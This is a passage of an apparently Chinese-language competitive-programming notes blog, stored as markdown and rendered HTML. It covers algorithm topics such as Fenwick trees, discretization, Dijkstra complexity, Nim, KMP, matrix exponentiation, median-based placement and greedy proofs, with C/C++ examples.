关于O((V+E)lgV)：对每个点都需要从堆中pop出来（除了源点），对于每条边，都需要把该边对应的一个点压进堆里或者decrease key，consider that，如果一个点被pop出来，那么该点就在result set里，所以不会再被压到堆里。所以是O((V+E)lgV)，如果使用斐波那契堆，因为压到堆里以及decrease key的代价是O(1)，所以是O(VlgV+E)\n\n### DP\n\n- DP要找到什么因素影响了当前你要求的东西，有影响的我们就处理，没影响的我们不用管\n\n### 浮点数输入\n\n- 由于是二进制，所以有些十进制有限小数成了无限的，所以读取时会截断，所以要加上一个偏移量（比如读入到小数点后6位，可以加一个$2*10^{-7}$，这样，截断部分如果比较大，就可以反映出来，如果比较小，不会对产生进位，则没影响）\n\n### 枚举所有素数\n\n- $O(N)$ 的做法\n   ```cpp\n   const int CNT = (int)1e9+10;\n   bool a[CNT];\n   int main() {\n       a[0] = a[1] = true;\n       FWD(i, 2, CNT) {\n           if (a[i]) {\n               continue;\n           }\n           for (int j = 2 * i; j < CNT; j += i) {\n                a[j] = true;\n           }\n       }\n   ```\n\n### 树状数组\n\n-   注意，a[0]是没有放东西的，因为$i-lowbit(i)+1 > 0$\n\n-   插线问点中，每一点 i 的值都是 sum(a[1] to a[i])。\n\n    ```c\n    //NYOJ 123\n    int c[1000010],N;\n    int lowbit(int x) //求最低位1的位置所表示的数\n    {\n        return x&(-x);\n    }\n    void update(int p,int q)//常规数组中的a[p]更新，在树状数组中需要这样更新\n    {\n\n        while(p<=N)\n        {\n            c[p]+=q;\n            p+=lowbit(p);\n        }\n    }\n    int S(int x)  //S(i)表示的是的前i个数的和\n    {\n        int sum=0;\n        while(x>0)\n        {\n            sum+=c[x];\n            cout<<\"sum: \"<<sum<<\" \";\n            x-=lowbit(x);\n        }\n        cout<<endl;\n        return sum;\n    }\n    int main()\n    {\n        int T;\n        char s[10];\n        scanf(\"%d%d\",&T,&N);\n        while(T--){\n            scanf(\"%s\",s);\n            if(s[0]=='A'){\n                int l,r,num;\n                scanf(\"%d%d%d\",&l,&r,&num);\n                update(l,num);\n                update(r+1,-num);\n              //每个士兵 i 的军功都是前 i 个元素的和，所以，[l, m]区间每个人加 num 的军功只需要给\n              //l 位置加上num，这样，[l, N]区间的每个人都加上了 num ，但是，我们只要[l, m]，所以要\n              //给 m+1 位置减去num,\n            }\n            else {\n                int x;\n                scanf(\"%d\",&x);\n                printf(\"%d\\n\",S(x));\n                for(int i=0;i<=x;i++) {\n                    cout<<c[i]<<\" \";\n                }\n                cout<<endl;\n                for(int i=0;i<=x;i++) {\n                    cout<<S(i)<<\" \";\n                }\n                cout<<endl;\n            }\n        }\n        return 0;\n    }\n    ```\n\n### 离散化\n\n-   [图形面积](https://vijos.org/p/1056)，[解答](http://www.cnblogs.com/forgot93/archive/2014/07/02/3819956.html)\n\n    ```cpp\n    #include<iostream>\n    #include <algorithm>\n    #include<string.h>\n    #include<cstdio>\n    #include<math.h>\n    using namespace std;\n    double x[201],y[201],s[101][4];\n    int xy[201][201];\n    int n,cas=0;\n    double sum;\n    int main()\n    {\n        int i,j,k;\n        while(cin>>n)\n        {\n            if(n==0)   break;\n            cas++;\n            k=0;\n            sum=0.0;\n            memset(xy,0,sizeof(xy));\n\n            for(i=1;i<=n;i++)\n            {\n                cin>>s[i][0]>>s[i][1]>>s[i][2]>>s[i][3];\n                x[k]=s[i][0];\n                y[k]=s[i][1];\n                k++;\n                x[k]=s[i][2];\n                y[k]=s[i][3];\n                k++;\n            }\n            sort(x,x+2*n);\n            sort(y,y+2*n);\n\n            for (int i=1;i<=n;i++)\n            {\n             int  i1=lower_bound(x,x+2*n,s[i][0])-x;//二分查找，跟普通的FOR语句一样\n             int  j1=lower_bound(y,y+2*n,s[i][1])-y;\n             int  i2=lower_bound(x,x+2*n,s[i][2])-x;\n             int  j2=lower_bound(y,y+2*n,s[i][3])-y;\n             for (int p1=i1;p1<i2;p1++)\n               //标记状态，记住我们是以一个方块的角标记状态所以p1<i2，不是<=\n             for (int p=j1;p<j2;p++)\n             xy[p1][p]=1;\n            }\n            for (int i=0;i<2*n;i++)//统计\n                for (int j=0;j<2*n;j++)\n                if (xy[i][j]) {\n                sum+=(x[i+1]-x[i])*(y[j+1]-y[j]);\n            }\n             printf(\"Test case #%d\\n\",cas);\n             printf(\"Total explored area: %.2f\\n\",sum);\n             printf(\"\\n\");\n        }\n        return 0;\n    }\n    ```\n\n    其实就是，把坐标间的距离都忽略掉，把坐标的集中在一起，一个挨着一个，然后遍历整个标记区域，某个单元格有标记说明该位置两边都对应地存在两个坐标（原始数据中的），则只需要知道这两个原始数据中的坐标相差多远，就可以知道这个标记代表着多大的面积。\n\n### POJ3278\n\n-   N是人的位置，K是牛的位置\n-   一种lgN的做法\n    -   如果N的二进制大于等于K的二进制，则直接走x-1法\n    -   否则，想办法修改N的二进制使得其与K的二进制的最高几位重合，然后接下来的二进制就直接用x2和+1来实现（二进制位为0则x2，为1则+1）\n    -   假设K与N重合的二进制部分为W\n        -   如果W&lt;N，可以消减N使得N==W，也可以N乘以多次2然后减去一些1使得N与新的W相同（因为随着N×2，其与K重合的最高二进制位变多，所以说是新的W）\n        -   如果W>N，可以先进行多次加一使得重合，或者是多次×2后多次-1使得重合\n        -   即使W小于N，也有可能先乘以几次2后在进行几次-1比较高效（因为可能后面很多个1，导致如果直接消减W）\n    -   总结起来就是，构造W与N相同的过程中，可以对N乘以一次2、两次2...P次2，对于每种乘2，减去或加上一些1使得重合，然后再计算在此基础上需要的时间\n    -   也就是不断试错的过程\n\n### 子集和问题的动态规划解法\n\n- 如果只是要求出是否有一个解法，或者是要求出有多少个解法，那么动态规划可行\n\n### 子集和问题变形\n\n- 问题：给定一个正整数M和另一个K，要求求出M切分成K份，每份都是正整数的解法有多少。同样可以动态规划\n\n### floyd求最小环\n\n- 最小环的定义：在有向或是无向的简单图中在找到一条路径，其从点x到点x，总的权重最小。（不可以直接x到x，在无向图中也不可以利用x到y，y到x，因为如果可以这样，意味着多重边或是使用同一条边）\n- 如果可以确定w[x][x] = INF，那么floyd然后找到最小的w[x][x]既可。\n- 否则，不可以通过使得所有的w[x][x]变为INF来实现，因为floyd过程中，会使用到\n\n### 查询第K大\n\n- 如果是静态数组，多次查询，直接一个sort\n- 如果是静态数组，一次查询，算导中那个快排变体，$O(N)$\n- 如果是动态数组，字典树——每个数以二进制表示，构造字典树，字典树的node需要维护当前node为root的子树的叶子数目，从而在任意一个非叶子节点，可以选择要走那条路下去——可以算出，二进制比x进制更快\n\n### Nim游戏（博弈论）\n\n- > 定义P-position和N-position，其中P代表Previous，N代表Next。直观的说，上一次move的人有必胜策略的局面是P-position，也就是“后手可保证必胜”或者“先手必败”，现在轮到move的人有必胜策略的局面是N-position，也就是“先手可保证必胜”。更严谨的定义是：1.无法进行任何移动的局面（也就是terminal position）是P-position；2.可以移动到P-position的局面是N-position；3.所有移动都导致N-position的局面是P-position。\n- P-position需要保证所有子格局都是N-position，N-position只要找到第一个子格局是P-position即可。\n- 通过数学归纳法，两堆石子的情况下，两堆相等是P-position\n- > 如果局面不可能重现，或者说positions的集合可以进行拓扑排序，那么每个position或者是P-position或者是N-position，而且可以通过定义计算出来。\n- \n\n### HDU3483\n\n##### [题意] \n输入n, x, m ，求$(1^x)*(x^1)+(2^x)*(x^2)+(3^x)*(x^3)+...+(n^x)*(x^n)$ \n\n##### [解题方法] \n\n设$f[n] = [x^n, n*(x^n), (n^2)*(x^n),..., (n^x)*(x^n)]$，则$f[n][k] = (n^k)*(x^n)$，问题转化为求：$(g[n] = f[1][x]+f[2][x]+...+f[n][x])$，设C(i,j)为组合数，即i种元素取j种的方法数，所以有：$$f[n+1][k] = ((n+1)^k)*(x^(n+1)) \\text{（二次多项式展开）}\\\\ = x*( C(k,0)*(x^n)+C(k,1)*n*(x^n)+...+C(k,k)*(n^k)*(x^n))\\\\= x*(C(k,0)*f[n][0]+C(k,1)*f[n][1]+...+C(k,k)*f[n][k])​$$\n所以得： \n\n```\n |x*1 0................................0|        |f[n][0]|       |f[n+1][0]| \n |x*1 x*1 0............................0|        |f[n][1]|       |f[n+1][1]| \n |x*1 x*2 x*1 0........................0|    *   |f[n][2]|   =   |f[n+1][2]| \n |......................................|        |.......|       |.........| \n |x*1 x*C(k,1) x*C(k,2)...x*C(k,x) 0...0|        |f[n][k]|       |f[n+1][k]| \n |......................................|        |.......|       |.........| \n |x*1 x*C(x,1) x*C(x,2).......x*C(x,x) 0|        |f[n][x]|       |f[n+1][x]| \n |0................................0 1 1|        |g[n-1] |       | g[ n ]  | \n```\n\n### KMP算法理解\n\n#### 预处理算法\n\n- 预处理出来的第 $i$ 位结果 $p[i]$ 是原字符串截止到第 $i$ 那个字符的最小周期，也就是只需要移动最少量的字符 $p[i]$ 既可以使得原先匹配部分再次匹配起来。\n\n### 为什么偶数长度的回文数字串不是primer\n\n- [ref](https://leetcode.com/problems/prime-palindrome/discuss/212297/Why-even-prime-palindromes-are-not-possible)\n- > Because even length prime digit numbers are divisible by 11 therefore are not prime.\n  > It's a trick that has to do powers of 10 and mod 11.\n  > Ex: 10 = 10^1 mod 11 = -1 mod 11\n  > ​      $100 = 10^2 = 1 \\mod 11$\n  > ​      $1000 = 10^3 = -1 \\mod 11$\n  > ​      $10000 = 10^4 = 1 \\mod 11$\n  > See the pattern? \n  > Even exponent powers of 10 are 1 mod 11 \n  > Odd exponent powers of 10 are -1 mod 11.\n  >\n  > We also know decimal numbers are just base 10 expansion of the digits.\n  >\n  > So   $1225 = (10^3*)1 + 2*(10^2) + 2*(10^1) + 5*(10^0).$\n  > ​        using modular arithmetic we can say,\n  >\n  >     1225 MOD 11 = (-1)*1 + 2*(1) + 2*(-1) + 5*(1) = -1 + 2 + 2 + 5 = 8.\n  >     \n  >     In other words, in MOD 11 we calculate what a decimal number is by just alternating the addition and subtraction across the digits.\n  > Another example.\n  >\n  > $1323412 \\mod 11 =   1 -3  +2 -3 +4 -1 +2\\mod 11 = 0.$\n  >\n  > Then it becomes why it is quite obvious why the above logic works for even palindromes.\n  >\n  > Example: \n  >\n  > $321123 =      -3 + 2 - 1 + 1 -2 + 3 = 0$. All the numbers cancel out with each other.\n\n### 贪心算法总结\n\n- 在每个贪心算法后面几乎总有一个DP解法\n- 如何**证明**是否可以用贪心算法求解一个问题？并没有通用方法，但是贪心选择性质和最优子结构是两个关键要素\n- 如果贪心选择时需要考虑众多选择，通常意味着可以改进贪心选择来获得更高效的解法\n\n##### 贪心选择性质\n\n- 可以通过做出局部最优的选择来构造全局最优\n- 证明方法：首先考察某个子问题的最优解，然后用贪心选择替换某个其他选择来修改此解，从而得到一个相似但是更小的子问题\n\n##### 一组有效的步骤\n\n- 确定问题的最优子结构（如果一个问题的最优解包含其子问题的最优解，则称此问题具有最优子结构性质）\n- 设计一个递归解法（该递归解法加上记忆就可以变成自顶向下的DP）\n- 证明如果做出一个贪心选择，就只剩下一个子问题（或许可能是几个子问题？不过子问题的数量确实要比自顶向下的DP解法少）\n- 证明贪心选择总是安全的\n  - 什么是安全的？\n  - 做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的\n  - 做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构\n- 设计一个递归算法实现贪心策略\n- 把递归算法转为迭代算法\n\n##### 一组简化的步骤\n\n- 将最优化问题转为这样的形式：做出一次选择后，只剩下一个子问题需要求解\n- 证明做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的\n- 证明做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构\n\n","content":"<h3 id=\"全源最短路径的一种错误解法\"><a href=\"#全源最短路径的一种错误解法\" class=\"headerlink\" title=\"全源最短路径的一种错误解法\"></a>全源最短路径的一种错误解法</h3><ul>\n<li><p>错误代码</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (~<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;N)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// assume that if no edge i-&gt;j, then input w[i][j] will be INF</span></span><br><span class=\"line\">        <span class=\"comment\">// and assume that w[i][i] == 0</span></span><br><span class=\"line\">        FWD(i, <span class=\"number\">0</span>, N) &#123;</span><br><span class=\"line\">            FWD(j, <span class=\"number\">0</span>, N) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;w[i][j]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">memset</span>(dp, <span class=\"number\">0xff</span>, <span class=\"keyword\">sizeof</span>(dp));</span><br><span class=\"line\">        FWD(i, <span class=\"number\">0</span>, N) &#123;</span><br><span class=\"line\">            FWD(j, <span class=\"number\">0</span>, N) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// if i == j, dfs can still return true answer</span></span><br><span class=\"line\">                dfs(i, j);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        FWD(i, <span class=\"number\">0</span>, N) &#123;</span><br><span class=\"line\">            FWD(j, <span class=\"number\">0</span>, N) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"%15d\"</span>, dp[i][j]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> visit[MAXV];</span><br><span class=\"line\"><span class=\"keyword\">int</span> __dfs(<span class=\"keyword\">int</span> now, <span class=\"keyword\">int</span> target);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">dfs</span><span class=\"params\">(<span class=\"keyword\">int</span> from, <span class=\"keyword\">int</span> target)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(visit, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(visit));</span><br><span class=\"line\">    visit[from] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> __dfs(from, target);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> __dfs(<span class=\"keyword\">int</span> now, <span class=\"keyword\">int</span> target) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (dp[now][target] &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> dp[now][target];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (now == target) &#123;</span><br><span class=\"line\">        dp[now][target] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>; <span class=\"comment\">// visit[now] will never be true;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> ans = INF;</span><br><span class=\"line\">    FWD(i, <span class=\"number\">0</span>, N) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (visit[i] || w[now][i] == INF || i==now) &#123; <span class=\"comment\">// avoid rings and not edge</span></span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        visit[i] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> p = __dfs(i, target) + w[now][i];</span><br><span class=\"line\">        visit[i] = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p &lt; ans) &#123;</span><br><span class=\"line\">            NEXT[now][target] = i; <span class=\"comment\">// record the NEXT vertex of i in the shortest path now-&gt;target</span></span><br><span class=\"line\">            ans = p;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    dp[now][target] = ans;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不可以使用这种dp</p>\n</li>\n<li><p>对于每对点执行dfs，然后执行过程中，记忆化搜索。当然，为了避免执行过程出现不断的走环路的情况，需要使用visit，避免dfs过程中走环路。</p>\n</li>\n<li><p>虽然复杂度是$O(V^3)$ ，但是算法是错的</p>\n</li>\n<li><p>记忆化搜索计算$(begin,target)$ 时，假设dfs过程中经过了点<code>i</code> ，为了避免环，<code>i</code>不可以经过<code>begin</code>，但是，可能$(i,target)$ 的最优路径就是<code>i</code>经过点<code>begin</code> 到达的。</p>\n</li>\n<li><p>但是，记忆化过程中，却把在dfs$(begin,target)$过程中 计算出来的$(i,target)$ 作为<code>i</code> 到<code>target</code> 的结果。</p>\n</li>\n</ul>\n<h3 id=\"NYOJ7\"><a href=\"#NYOJ7\" class=\"headerlink\" title=\"NYOJ7\"></a>NYOJ7</h3><blockquote>\n<h5 id=\"题目描述\"><a href=\"#题目描述\" class=\"headerlink\" title=\"题目描述:\"></a>题目描述:</h5><p>一个街区有很多住户，街区的街道只能为东西、南北两种方向。<br>住户只可以沿着街道行走。<br>各个街道之间的间隔相等。<br>用(x,y)来表示住户坐在的街区。<br>例如（4,20），表示用户在东西方向第4个街道，南北方向第20个街道。<br>现在要建一个邮局，使得各个住户到邮局的距离之和最少。<br>求现在这个邮局应该建在那个地方使得所有住户距离之和最小；</p>\n<h5 id=\"输入描述\"><a href=\"#输入描述\" class=\"headerlink\" title=\"输入描述:\"></a>输入描述:</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 第一行一个整数n&lt;20，表示有n组测试数据，下面是n组数据;</span><br><span class=\"line\">&gt; 每组第一行一个整数m&lt;20,表示本组有m个住户，下面的m行每行有两个整数0&lt;x,y&lt;100，表示某个用户所在街区的坐标。</span><br><span class=\"line\">&gt; m行后是新一组的数据；</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<h5 id=\"输出描述\"><a href=\"#输出描述\" class=\"headerlink\" title=\"输出描述:\"></a>输出描述:</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 每组数据输出到邮局最小的距离和，回车结束；</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<h5 id=\"样例输入\"><a href=\"#样例输入\" class=\"headerlink\" title=\"样例输入:\"></a>样例输入:</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 2</span><br><span class=\"line\">&gt; 3</span><br><span class=\"line\">&gt; 1 1</span><br><span class=\"line\">&gt; 2 1</span><br><span class=\"line\">&gt; 1 2</span><br><span class=\"line\">&gt; 5</span><br><span class=\"line\">&gt; 2 9 </span><br><span class=\"line\">&gt; 5 20</span><br><span class=\"line\">&gt; 11 9</span><br><span class=\"line\">&gt; 1 1</span><br><span class=\"line\">&gt; 1 20</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<h5 id=\"样例输出\"><a href=\"#样例输出\" class=\"headerlink\" title=\"样例输出:\"></a>样例输出:</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 2</span><br><span class=\"line\">&gt; 44</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<ul>\n<li>考虑横坐标的情况，取那个横坐标可以使得大家的在横坐标上需要走的距离最短？显然是中位数——反证法，加入有N个点，如果N是奇数，那么中位数就是d[N/2]，然后，尝试采用第N/2-1个点计算，显然，总量的变化是（设 t = d[N/2]-d[N/2-1] ），$+t<em>(N/2+1)-t</em>N/2$ ，也就是缩短的对于前N/2的用户来说，是缩短了，但是对于后面N/2+1个用户来说延长了</li>\n<li>所以，无论y坐标取值多少，x坐标都要取中位数。同理，y也要取中位数</li>\n</ul>\n<h3 id=\"01背包\"><a href=\"#01背包\" class=\"headerlink\" title=\"01背包\"></a>01背包</h3><ul>\n<li>动态规划算法是伪多项式复杂度$O(NW)$，如果W很大，那么可能，直接枚举N元素的集合的所有子集会更快一些</li>\n</ul>\n<h3 id=\"找出一个序列中任意长度的逆序对\"><a href=\"#找出一个序列中任意长度的逆序对\" class=\"headerlink\" title=\"找出一个序列中任意长度的逆序对\"></a>找出一个序列中任意长度的逆序对</h3><ul>\n<li>首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i&gt;x_{i+1}&gt;x_{i+2}&gt;…$那么就是逆序对</li>\n<li>主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量</li>\n<li>假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n]</li>\n<li>首先看看如何求二元逆序对<ul>\n<li>从左到右扫描序列，对于值位置为<code>i</code>的值<code>x</code>，flag[x]+=1</li>\n<li>然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i]</li>\n<li>那么result的数组的和就是逆序对的数量</li>\n<li>同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对</li>\n</ul>\n</li>\n<li>三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result_2数组)，此时设另外的两个数组int flag_3[MAX+1], int result_3[n];<ul>\n<li>同样扫描序列，对于位置为<code>i</code>的数<code>x</code>，取出result_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag_3[x]记录了截止目前，以x结尾的二元组逆序对的数量</li>\n<li>求$\\sum_{j=x+1}^{MAX}flag_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中</li>\n<li>到最后，result_3就是结果</li>\n</ul>\n</li>\n<li>更多元组的也如此思路</li>\n<li>这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对</li>\n<li>对于n元逆序对，同理，数组记录了当前已有的数<code>x</code>作为<code>最后一个元素是x的n-1元逆序对</code>的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与<code>比他大的数代表的n-1元逆序对</code>形成了更长的逆序对</li>\n<li>然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第<code>i</code>位的值是<code>x</code>）</li>\n</ul>\n<blockquote>\n<p>3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）</p>\n</blockquote>\n<h3 id=\"关于使用优先队列的bfs\"><a href=\"#关于使用优先队列的bfs\" class=\"headerlink\" title=\"关于使用优先队列的bfs\"></a>关于使用优先队列的bfs</h3><ul>\n<li>其实就是dijstra单源最短路径算法</li>\n<li>关于O((V+E)lgV)：对每个点都需要从堆中pop出来（除了源点），对于每条边，都需要把该边对应的一个点压进堆里或者decrease key，consider that，如果一个点被pop出来，那么该点就在result set里，所以不会再被压到堆里。所以是O((V+E)lgV)，如果使用斐波那契堆，因为压到堆里以及decrease key的代价是O(1)，所以是O(VlgV+E)</li>\n</ul>\n<h3 id=\"DP\"><a href=\"#DP\" class=\"headerlink\" title=\"DP\"></a>DP</h3><ul>\n<li>DP要找到什么因素影响了当前你要求的东西，有影响的我们就处理，没影响的我们不用管</li>\n</ul>\n<h3 id=\"浮点数输入\"><a href=\"#浮点数输入\" class=\"headerlink\" title=\"浮点数输入\"></a>浮点数输入</h3><ul>\n<li>由于是二进制，所以有些十进制有限小数成了无限的，所以读取时会截断，所以要加上一个偏移量（比如读入到小数点后6位，可以加一个$2*10^{-7}$，这样，截断部分如果比较大，就可以反映出来，如果比较小，不会对产生进位，则没影响）</li>\n</ul>\n<h3 id=\"枚举所有素数\"><a href=\"#枚举所有素数\" class=\"headerlink\" title=\"枚举所有素数\"></a>枚举所有素数</h3><ul>\n<li>$O(N)$ 的做法 <figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> CNT = (<span class=\"keyword\">int</span>)<span class=\"number\">1e9</span>+<span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">bool</span> a[CNT];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    a[<span class=\"number\">0</span>] = a[<span class=\"number\">1</span>] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    FWD(i, <span class=\"number\">2</span>, CNT) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a[i]) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">2</span> * i; j &lt; CNT; j += i) &#123;</span><br><span class=\"line\">             a[j] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"树状数组\"><a href=\"#树状数组\" class=\"headerlink\" title=\"树状数组\"></a>树状数组</h3><ul>\n<li><p>注意，a[0]是没有放东西的，因为$i-lowbit(i)+1 &gt; 0$</p>\n</li>\n<li><p>插线问点中，每一点 i 的值都是 sum(a[1] to a[i])。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span 